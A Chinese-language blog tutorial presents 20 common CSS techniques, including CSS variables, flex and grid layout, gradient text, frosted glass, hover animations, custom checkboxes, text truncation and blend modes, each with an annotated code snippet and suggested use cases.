<h3 data-id="heading-0">1. 使用变量维护主题色</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 定义CSS变量 */</span>
<span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-attr">--primary-color</span>: <span class="hljs-number">#3498db</span>;
  <span class="hljs-attr">--secondary-color</span>: <span class="hljs-number">#2ecc71</span>;
  <span class="hljs-attr">--text-color</span>: <span class="hljs-number">#333</span>;
}

<span class="hljs-comment">/* 使用变量 */</span>
<span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--primary-color);
  <span class="hljs-attribute">color</span>: white;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">border</span>: none;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;
}

<span class="hljs-selector-class">.card</span> {
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">var</span>(--secondary-color);
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color);
}
</code></pre>
<p><strong>适用场景</strong>：需要维护统一设计规范的项目，方便快速切换主题</p>
<h3 data-id="heading-1">2.  Flex布局居中（终极解决方案）</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.center-container</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: center; <span class="hljs-comment">/* 水平居中 */</span>
  <span class="hljs-attribute">align-items</span>: center;     <span class="hljs-comment">/* 垂直居中 */</span>
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;          <span class="hljs-comment">/* 视口高度 */</span>
}

<span class="hljs-comment">/* 如果只需要单方向居中 */</span>
<span class="hljs-selector-class">.vertical-center</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">align-items</span>: center;    <span class="hljs-comment">/* 仅垂直居中 */</span>
}

<span class="hljs-selector-class">.horizontal-center</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: center; <span class="hljs-comment">/* 仅水平居中 */</span>
}
</code></pre>
<p><strong>适用场景</strong>：任何需要居中的布局，特别是响应式设计</p>
<h3 data-id="heading-2">3.  Grid网格布局</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.grid-container</span> {
  <span class="hljs-attribute">display</span>: grid;
  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>fr); <span class="hljs-comment">/* 3等分列 */</span>
  <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">20px</span>;                       <span class="hljs-comment">/* 网格间距 */</span>
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
}

<span class="hljs-selector-class">.grid-item</span> {
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#f0f0f0</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
}

<span class="hljs-comment">/* 响应式网格 */</span>
<span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) {
  <span class="hljs-selector-class">.grid-container</span> {
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>fr); <span class="hljs-comment">/* 小屏幕2列 */</span>
  }
}

<span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">480px</span>) {
  <span class="hljs-selector-class">.grid-container</span> {
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr; <span class="hljs-comment">/* 超小屏幕1列 */</span>
  }
}
</code></pre>
<p><strong>适用场景</strong>：复杂布局、卡片布局、图片画廊</p>
<h3 data-id="heading-3">4. 自定义滚动条</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.custom-scrollbar</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">overflow-y</span>: scroll;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
}

<span class="hljs-comment">/* Webkit浏览器滚动条样式 */</span>
<span class="hljs-selector-class">.custom-scrollbar</span>::-webkit-scrollbar {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">8px</span>; <span class="hljs-comment">/* 滚动条宽度 */</span>
}

<span class="hljs-selector-class">.custom-scrollbar</span>::-webkit-scrollbar-track {
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#f1f1f1</span>; <span class="hljs-comment">/* 轨道背景 */</span>
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
}

<span class="hljs-selector-class">.custom-scrollbar</span>::-webkit-scrollbar-thumb {
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#c1c1c1</span>; <span class="hljs-comment">/* 滑块颜色 */</span>
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
}

<span class="hljs-selector-class">.custom-scrollbar</span>::-webkit-scrollbar-thumb:hover {
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#a8a8a8</span>; <span class="hljs-comment">/* 悬停颜色 */</span>
}
</code></pre>
<p><strong>适用场景</strong>：需要统一浏览器滚动条样式的项目</p>
<h3 data-id="heading-4">5. 文字渐变效果</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.gradient-text</span> {
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">45deg</span>, <span class="hljs-number">#ff6b6b</span>, <span class="hljs-number">#4ecdc4</span>);
  -webkit-<span class="hljs-attribute">background-clip</span>: text; <span class="hljs-comment">/* 关键：背景裁剪到文字 */</span>
  -webkit-text-fill-<span class="hljs-attribute">color</span>: transparent; <span class="hljs-comment">/* 关键：文字透明 */</span>
  <span class="hljs-attribute">background-clip</span>: text;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">3rem</span>;
  <span class="hljs-attribute">font-weight</span>: bold;
}
</code></pre>
<p><strong>适用场景</strong>：标题设计、品牌文字、特色展示</p>
<h3 data-id="heading-5">6. 毛玻璃效果</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.frosted-glass</span> {
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.25</span>); <span class="hljs-comment">/* 半透明背景 */</span>
  backdrop-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">10px</span>);           <span class="hljs-comment">/* 背景模糊 */</span>
  -webkit-backdrop-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">10px</span>);   <span class="hljs-comment">/* Safari支持 */</span>
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.18</span>);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">color</span>: white;
}
</code></pre>
<p><strong>适用场景</strong>：现代设计风格、卡片悬浮效果、导航栏</p>
<h3 data-id="heading-6">7. 悬浮阴影动画</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.card</span> {
  <span class="hljs-attribute">background</span>: white;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span> ease; <span class="hljs-comment">/* 所有属性过渡0.3秒 */</span>
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">10px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
}

<span class="hljs-selector-class">.card</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">5px</span>); <span class="hljs-comment">/* 悬浮上移5px */</span>
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-number">30px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>); <span class="hljs-comment">/* 阴影加深 */</span>
}
</code></pre>
<p><strong>适用场景</strong>：卡片设计、按钮交互、产品展示</p>
<h3 data-id="heading-7">8. 自定义复选框</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 隐藏原生复选框 */</span>
<span class="hljs-selector-class">.custom-checkbox</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"checkbox"</span>]</span> {
  <span class="hljs-attribute">display</span>: none;
}

<span class="hljs-comment">/* 自定义复选框样式 */</span>
<span class="hljs-selector-class">.checkbox-label</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">cursor</span>: pointer;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
}

<span class="hljs-selector-class">.checkmark</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-number">#ddd</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
  <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span> ease;
}

<span class="hljs-comment">/* 选中状态 */</span>
<span class="hljs-selector-class">.custom-checkbox</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"checkbox"</span>]</span><span class="hljs-selector-pseudo">:checked</span> + <span class="hljs-selector-class">.checkbox-label</span> <span class="hljs-selector-class">.checkmark</span> {
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#3498db</span>;
  <span class="hljs-attribute">border-color</span>: <span class="hljs-number">#3498db</span>;
}

<span class="hljs-comment">/* 选中后的对勾 */</span>
<span class="hljs-selector-class">.custom-checkbox</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">"checkbox"</span>]</span><span class="hljs-selector-pseudo">:checked</span> + <span class="hljs-selector-class">.checkbox-label</span> <span class="hljs-selector-class">.checkmark</span><span class="hljs-selector-pseudo">::after</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">""</span>;
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">6px</span>;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">2px</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">6px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">border</span>: solid white;
  <span class="hljs-attribute">border-width</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> <span class="hljs-number">0</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">45deg</span>);
}
</code></pre>
<p><strong>适用场景</strong>：表单美化、统一设计语言</p>
<h3 data-id="heading-8">9. 图片悬浮放大</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.image-container</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">overflow</span>: hidden; <span class="hljs-comment">/* 隐藏溢出部分 */</span>
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
}

<span class="hljs-selector-class">.zoom-image</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">object-fit</span>: cover; <span class="hljs-comment">/* 保持图片比例 */</span>
  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.5s</span> ease; <span class="hljs-comment">/* 缩放过渡 */</span>
}

<span class="hljs-selector-class">.zoom-image</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.1</span>); <span class="hljs-comment">/* 悬浮放大1.1倍 */</span>
}
</code></pre>
<p><strong>适用场景</strong>：产品图集、相册、作品展示</p>
<h3 data-id="heading-9">10. 文字阴影效果</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.text-shadow</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">3rem</span>;
  <span class="hljs-attribute">font-weight</span>: bold;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#2c3e50</span>;
  <span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.3</span>); <span class="hljs-comment">/* 水平 垂直 模糊 颜色 */</span>
}

<span class="hljs-comment">/* 多层阴影效果 */</span>
<span class="hljs-selector-class">.multi-shadow</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">3rem</span>;
  <span class="hljs-attribute">font-weight</span>: bold;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#e74c3c</span>;
  <span class="hljs-attribute">text-shadow</span>: 
    <span class="hljs-number">1px</span> <span class="hljs-number">1px</span> <span class="hljs-number">0</span> <span class="hljs-number">#c0392b</span>,
    <span class="hljs-number">2px</span> <span class="hljs-number">2px</span> <span class="hljs-number">0</span> <span class="hljs-number">#922b21</span>,
    <span class="hljs-number">3px</span> <span class="hljs-number">3px</span> <span class="hljs-number">5px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.6</span>);
}
</code></pre>
<p><strong>适用场景</strong>：标题设计、文字特效、海报设计</p>
<h3 data-id="heading-10">11. 渐变边框</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.gradient-border</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">border</span>: <span class="hljs-number">4px</span> solid;
  <span class="hljs-attribute">border-image</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">45deg</span>, <span class="hljs-number">#ff6b6b</span>, <span class="hljs-number">#4ecdc4</span>) <span class="hljs-number">1</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
  <span class="hljs-attribute">background</span>: white;
}

<span class="hljs-comment">/* 另一种实现方式 */</span>
<span class="hljs-selector-class">.gradient-border-alt</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">background</span>: 
    <span class="hljs-built_in">linear-gradient</span>(white, white) padding-box,
    <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">45deg</span>, <span class="hljs-number">#ff6b6b</span>, <span class="hljs-number">#4ecdc4</span>) border-box;
  <span class="hljs-attribute">border</span>: <span class="hljs-number">4px</span> solid transparent;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
}
</code></pre>
<p><strong>适用场景</strong>：特色边框、高亮元素、品牌标识</p>
<h3 data-id="heading-11">12. 粘性定位</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.sticky-header</span> {
  <span class="hljs-attribute">position</span>: sticky;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>; <span class="hljs-comment">/* 距离顶部0时固定 */</span>
  <span class="hljs-attribute">background</span>: white;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span> <span class="hljs-number">0</span>;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">10px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">1000</span>; <span class="hljs-comment">/* 确保在最上层 */</span>
}

<span class="hljs-selector-class">.sticky-sidebar</span> {
  <span class="hljs-attribute">position</span>: sticky;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">100px</span>; <span class="hljs-comment">/* 距离顶部100px时固定 */</span>
  <span class="hljs-attribute">align-self</span>: start; <span class="hljs-comment">/* Grid布局中对齐 */</span>
}
</code></pre>
<p><strong>适用场景</strong>：导航栏、侧边栏、表头固定</p>
<h3 data-id="heading-12">13. 文字溢出省略</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 单行文字溢出显示省略号 */</span>
<span class="hljs-selector-class">.single-line-ellipsis</span> {
  <span class="hljs-attribute">white-space</span>: nowrap;      <span class="hljs-comment">/* 不换行 */</span>
  <span class="hljs-attribute">overflow</span>: hidden;         <span class="hljs-comment">/* 隐藏溢出 */</span>
  <span class="hljs-attribute">text-overflow</span>: ellipsis;  <span class="hljs-comment">/* 显示省略号 */</span>
  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
}

<span class="hljs-comment">/* 多行文字溢出显示省略号 */</span>
<span class="hljs-selector-class">.multi-line-ellipsis</span> {
  <span class="hljs-attribute">display</span>: -webkit-box;
  -webkit-line-clamp: <span class="hljs-number">3</span>;    <span class="hljs-comment">/* 显示3行 */</span>
  -webkit-box-orient: vertical;
  <span class="hljs-attribute">overflow</span>: hidden;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;
}
</code></pre>
<p><strong>适用场景</strong>：标题截断、内容摘要、表格单元格</p>
<h3 data-id="heading-13">14. 自定义选择文本样式</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-pseudo">::selection</span> {
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#3498db</span>;    <span class="hljs-comment">/* 选中背景色 */</span>
  <span class="hljs-attribute">color</span>: white;           <span class="hljs-comment">/* 选中文字颜色 */</span>
  <span class="hljs-attribute">text-shadow</span>: none;      <span class="hljs-comment">/* 去除文字阴影 */</span>
}

<span class="hljs-comment">/* 针对不同浏览器前缀 */</span>
::-moz-selection {
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#3498db</span>;
  <span class="hljs-attribute">color</span>: white;
  <span class="hljs-attribute">text-shadow</span>: none;
}
</code></pre>
<p><strong>适用场景</strong>：提升用户体验、品牌一致性</p>
<h3 data-id="heading-14">15. 滤镜效果</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.image-filters</span> {
  <span class="hljs-attribute">transition</span>: filter <span class="hljs-number">0.3s</span> ease;
}

<span class="hljs-comment">/* 灰度效果 */</span>
<span class="hljs-selector-class">.grayscale</span> {
  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>);
}

<span class="hljs-selector-class">.grayscale</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">0%</span>);
}

<span class="hljs-comment">/* 多个滤镜组合 */</span>
<span class="hljs-selector-class">.multiple-filters</span> {
  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">brightness</span>(<span class="hljs-number">1.2</span>) <span class="hljs-built_in">contrast</span>(<span class="hljs-number">0.8</span>) <span class="hljs-built_in">saturate</span>(<span class="hljs-number">1.5</span>);
}

<span class="hljs-comment">/* 模糊效果 */</span>
<span class="hljs-selector-class">.blur-effect</span> {
  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">2px</span>);
}
</code></pre>
<p><strong>适用场景</strong>：图片特效、主题切换、视觉设计</p>
<h3 data-id="heading-15">16. 动画关键帧</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-keyword">@keyframes</span> bounce {
  <span class="hljs-number">0%</span>, <span class="hljs-number">100%</span> {
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">/* 起始和结束位置 */</span>
  }
  <span class="hljs-number">50%</span> {
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">20px</span>); <span class="hljs-comment">/* 跳起位置 */</span>
  }
}

<span class="hljs-selector-class">.bouncing-element</span> {
  <span class="hljs-attribute">animation</span>: bounce <span class="hljs-number">2s</span> ease-in-out infinite; <span class="hljs-comment">/* 动画名称 时长 缓动 重复 */</span>
}

<span class="hljs-comment">/* 加载动画 */</span>
<span class="hljs-keyword">@keyframes</span> spin {
  <span class="hljs-number">0%</span> {
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">0deg</span>);
  }
  <span class="hljs-number">100%</span> {
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">360deg</span>);
  }
}

<span class="hljs-selector-class">.loading-spinner</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">40px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;
  <span class="hljs-attribute">border</span>: <span class="hljs-number">4px</span> solid <span class="hljs-number">#f3f3f3</span>;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">4px</span> solid <span class="hljs-number">#3498db</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">animation</span>: spin <span class="hljs-number">1s</span> linear infinite;
}
</code></pre>
<p><strong>适用场景</strong>：加载动画、交互动效、注意力引导</p>
<h3 data-id="heading-16">17. 响应式图片</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.responsive-image</span> {
  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">100%</span>;    <span class="hljs-comment">/* 最大宽度100% */</span>
  <span class="hljs-attribute">height</span>: auto;       <span class="hljs-comment">/* 高度自动 */</span>
  <span class="hljs-attribute">display</span>: block;     <span class="hljs-comment">/* 块级元素 */</span>
}

<span class="hljs-comment">/* 保持比例的容器 */</span>
<span class="hljs-selector-class">.aspect-ratio-box</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">padding-bottom</span>: <span class="hljs-number">56.25%</span>; <span class="hljs-comment">/* 16:9比例 (9/16=0.5625) */</span>
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">overflow</span>: hidden;
}

<span class="hljs-selector-class">.aspect-ratio-box</span> <span class="hljs-selector-tag">img</span> {
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">object-fit</span>: cover; <span class="hljs-comment">/* 覆盖整个容器 */</span>
}
</code></pre>
<p><strong>适用场景</strong>：响应式网站、图片画廊、产品展示</p>
<h3 data-id="heading-17">18. 三角形绘制</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.triangle-up</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">100px</span> solid <span class="hljs-number">#3498db</span>;
}

<span class="hljs-selector-class">.triangle-down</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">100px</span> solid <span class="hljs-number">#e74c3c</span>;
}

<span class="hljs-selector-class">.triangle-left</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">border-top</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-bottom</span>: <span class="hljs-number">50px</span> solid transparent;
  <span class="hljs-attribute">border-right</span>: <span class="hljs-number">100px</span> solid <span class="hljs-number">#2ecc71</span>;
}
</code></pre>
<p><strong>适用场景</strong>：工具提示、下拉箭头、装饰元素</p>
<h3 data-id="heading-18">19. 文字描边效果</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.text-stroke</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">3rem</span>;
  <span class="hljs-attribute">font-weight</span>: bold;
  <span class="hljs-attribute">color</span>: white;
  -webkit-text-stroke: <span class="hljs-number">2px</span> <span class="hljs-number">#3498db</span>; <span class="hljs-comment">/* 描边宽度和颜色 */</span>
  text-stroke: <span class="hljs-number">2px</span> <span class="hljs-number">#3498db</span>;
}

<span class="hljs-comment">/* 兼容写法 */</span>
<span class="hljs-selector-class">.text-stroke-alt</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">3rem</span>;
  <span class="hljs-attribute">font-weight</span>: bold;
  <span class="hljs-attribute">color</span>: transparent;
  -webkit-text-stroke: <span class="hljs-number">2px</span> <span class="hljs-number">#3498db</span>;
  <span class="hljs-attribute">text-shadow</span>: none;
}
</code></pre>
<p><strong>适用场景</strong>：标题设计、海报文字、特色展示</p>
<h3 data-id="heading-19">20. 混合模式</h3>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.blend-mode</span> {
  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">'background.jpg'</span>);
  <span class="hljs-attribute">background-size</span>: cover;
}

<span class="hljs-selector-class">.blend-mode</span><span class="hljs-selector-pseudo">::before</span> {
  <span class="hljs-attribute">content</span>: <span class="hljs-string">""</span>;
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">right</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#3498db</span>;
  <span class="hljs-attribute">mix-blend-mode</span>: overlay; <span class="hljs-comment">/* 叠加混合模式 */</span>
}

<span class="hljs-comment">/* 图片混合模式 */</span>
<span class="hljs-selector-class">.image-blend</span> {
  <span class="hljs-attribute">background</span>: 
    <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">45deg</span>, <span class="hljs-number">#ff6b6b</span>, <span class="hljs-number">#4ecdc4</span>),
    <span class="hljs-built_in">url</span>(<span class="hljs-string">'image.jpg'</span>);
  <span class="hljs-attribute">background-blend-mode</span>: overlay;
  <span class="hljs-attribute">background-size</span>: cover;
}
</code></pre>
<p><strong>适用场景</strong>：创意设计、图片处理、视觉效果</p>
<hr/>
<h3 data-id="heading-20">总结</h3>
<p>这20个CSS技巧包含了现代最常见的开发需求，从布局到动画，从响应式到视觉效果。掌握这些技巧，你就能应对90%的日常开发需求。</p>
<p>其中有几点比较关键：</p>
<ol>
<li><strong>变量管理</strong>让维护更轻松</li>
<li><strong>Flex/Grid</strong>是布局的首选</li>
<li><strong>过渡和动画</strong>提升用户体验</li>
</ol>
<p>希望这些技巧能帮助你在开发中事半功倍！</p>
<blockquote>
<p>本文首发于公众号：程序员刘大华，专注分享前后端开发的实战笔记。关注我，少走弯路，一起进步！</p>
</blockquote>
<h4 data-id="heading-21">📌往期精彩</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F72THiVPtsrA2xvtHmdDLmA" target="_blank" title="https://mp.weixin.qq.com/s/72THiVPtsrA2xvtHmdDLmA" ref="nofollow noopener noreferrer">《SpringBoot+Vue3 整合 SSE 实现实时消息推送》</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FP7SMincYFKERZbNKAFtzGQ" target="_blank" title="https://mp.weixin.qq.com/s/P7SMincYFKERZbNKAFtzGQ" ref="nofollow noopener noreferrer">《这20条SQL优化方案，让你的数据库查询速度提升10倍》</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FgQK9L1TxKL50FUVMcgh6JQ" target="_blank" title="https://mp.weixin.qq.com/s/gQK9L1TxKL50FUVMcgh6JQ" ref="nofollow noopener noreferrer">《SpringBoot 动态菜单权限系统设计的企业级解决方案》</a></p>
